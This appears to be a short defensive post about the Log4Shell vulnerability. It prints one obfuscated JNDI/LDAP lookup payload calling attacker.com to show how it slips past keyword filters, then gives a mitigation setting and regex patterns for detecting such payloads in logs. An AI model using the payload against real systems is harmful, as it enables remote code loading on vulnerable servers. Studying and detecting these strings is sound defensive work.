# Log4Shell notes

If you're filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you:
```shell
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
```
This gets past every filter I've found so far. There's no shortage of these bypasses.

Block the log4j zero day...
```shell
echo "export LOG4J_FORMAT_MSG_NO_LOOKUPS=true" >> /etc/profile.d/blockzero.sh`
```
I know that using regex is dumb and shit, but it's just first-line defense. This one I made is capable to detect obfuscated payloads and should produce very few false positives:
```shell
\${(\${(.*?:|.*?:.*?:-)('|"|`)*(?1)}*|[jndi:(ldap|rm)]('|"|`)*}*){9,10}
```
Added support for LDAPS:
```shell
\${(\${(.*?:|.*?:.*?:-)('|"|`)*(?1)}*|[jndi:lapsrm]('|"|`)*}*){9,11}
```
Also, better pipe the logs through an URL decoder before running the regex
